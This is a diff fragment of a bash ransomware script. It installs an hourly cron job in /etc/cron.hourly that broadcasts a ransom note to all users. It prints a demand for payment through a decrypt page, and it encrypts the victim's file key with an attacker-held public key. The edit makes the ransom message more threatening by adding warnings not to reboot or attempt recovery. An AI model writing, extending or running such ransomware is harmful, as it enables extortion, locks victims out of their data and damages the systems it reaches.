@@ -196,7 +196,7 @@ done
   echo -e "\n"
   echo -e "wallCmd=\$(which wall)"
   echo -e "\n"
-  echo -e "echo \"Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit https://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever.\" | \${wallCmd}"
+  echo -e "echo -e \"Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit https://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever.\\n\\nIMPORTANT: DO NOT REBOOT YOUR SERVER. DO NOT ATTEMPT RECOVERY WITHOUT PURCHASING OUR DECRYPTION SOFTWARE. IF YOU DO SO, SYSTEM RECOVERY WILL BECOME IMPOSSIBLE.\" | \${wallCmd}"
 } > /etc/cron.hourly/instructions.sh
 
 chmod 755 /etc/cron.hourly/instructions.sh
@@ -211,7 +211,7 @@ else
   echo "Could not set crontab" &>/dev/null
 fi
 
-echo "Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit https://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever."
+echo -e "Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit https://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever.\n\nIMPORTANT: DO NOT REBOOT YOUR SERVER. DO NOT ATTEMPT RECOVERY WITHOUT PURCHASING OUR DECRYPTION SOFTWARE. IF YOU DO SO, SYSTEM RECOVERY WILL BECOME IMPOSSIBLE."
 
 # Encrypt key.bin with our public key
 openssl rsautl -encrypt -inkey /root/pub.pem -pubin -in /root/key.bin -out /root/key.bin.enc
